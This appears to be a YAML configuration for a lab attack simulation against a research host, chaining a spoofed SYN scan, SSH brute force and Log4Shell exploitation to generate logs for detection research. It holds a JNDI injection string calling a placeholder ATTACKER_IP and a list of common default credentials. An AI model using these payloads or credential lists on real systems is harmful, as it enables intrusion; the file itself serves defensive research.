campaign:
  name: "Full Recon → SSH → Log4Shell"
  description: >
    Three-phase attack campaign simulating a realistic intrusion sequence:
    reconnaissance (SYN scan), credential brute force, then Log4Shell
    exploitation. Each phase uses distinct timing profiles to create
    non-stationary distribution shifts for continual learning.
  seed: 42

  target:
    host: 192.168.2.201
    ssh_user: researcher
    ssh_key: ~/.ssh/isildur_research
    ssh_port: 22

  phases:
    # Phase 1: Network reconnaissance via SYN scanning
    - name: "Network Reconnaissance"
      module: recon
      mitre_technique: "T1046"
      mitre_tactic: "TA0007"
      attack_type: discovery
      attack_stage: recon
      severity: 1
      params:
        ports: [22, 80, 443, 8080, 3306, 5432]
        scan_type: syn
      ip_source:
        strategy: spoofed
        count: 500
        subnet: "10.0.0.0/8"
      timing:
        duration_seconds: 120
        profile: constant
        jitter_ms: [50, 300]
        delay_after_seconds: 30

    # Phase 2: SSH brute force with accelerating cadence
    - name: "SSH Credential Brute Force"
      module: ssh_brute_force
      mitre_technique: "T1110.001"
      mitre_tactic: "TA0006"
      attack_type: brute_force
      attack_stage: initial_access
      severity: 2
      params:
        usernames: ["root", "admin", "ubuntu", "deploy", "postgres",
                     "www-data", "git", "jenkins"]
        passwords: ["password", "123456", "admin", "root", "toor",
                     "letmein", "changeme", "welcome1", "qwerty",
                     "password123", "P@ssw0rd", "summer2024"]
        target_port: 22
        max_attempts_per_ip: 15
      ip_source:
        strategy: aliased
        count: 8
        subnet: "192.168.2.0/24"
        start_offset: 100
        interface: en0
      timing:
        duration_seconds: 600
        profile: accelerating
        delay_after_seconds: 60
        profile_params:
          phases:
            - label: cautious
              fraction: 0.3
              jitter_ms: [3000, 8000]
            - label: probing
              fraction: 0.4
              jitter_ms: [500, 2000]
            - label: aggressive
              fraction: 0.3
              jitter_ms: [50, 300]

    # Phase 3: Log4Shell exploitation with decelerating cadence
    - name: "Log4Shell Exploitation"
      module: log4shell
      mitre_technique: "T1190"
      mitre_tactic: "TA0001"
      attack_type: web_exploit
      attack_stage: initial_access
      severity: 3
      params:
        target_port: 80
        path: /
        jndi_string: "${jndi:ldap://ATTACKER_IP:1389/exploit}"
        injection_headers: ["X-Api-Version", "User-Agent", "Referer",
                            "X-Forwarded-For", "Accept-Language"]
        num_requests: 200
      ip_source:
        strategy: aliased
        count: 5
        subnet: "192.168.2.0/24"
        start_offset: 110
        interface: en0
      timing:
        duration_seconds: 300
        profile: decelerating
        delay_after_seconds: 0
        profile_params:
          phases:
            - label: spray
              fraction: 0.3
              jitter_ms: [50, 200]
            - label: targeted
              fraction: 0.4
              jitter_ms: [500, 1500]
            - label: evasive
              fraction: 0.3
              jitter_ms: [2000, 5000]

  collection:
    ebpf:
      enabled: true
      baseline_seconds: 30
    log_sources:
      - name: auth_log
        parser: auth_log
        remote_path: /var/log/auth.log
      - name: syslog
        parser: syslog
        remote_path: /var/log/syslog
      - name: web_access
        parser: web_access
        remote_path: /var/log/nginx/access.log
      - name: web_error
        parser: web_error
        remote_path: /var/log/nginx/error.log
      - name: journal
        parser: journal
        remote_command: "journalctl --since '1 hour ago' -o json"
      - name: auditd
        parser: auditd
        remote_command: "sudo -n ausearch -k research_exploit --raw"
    output:
      db_path: data/campaigns_v2.db
      time_buffer_seconds: 60
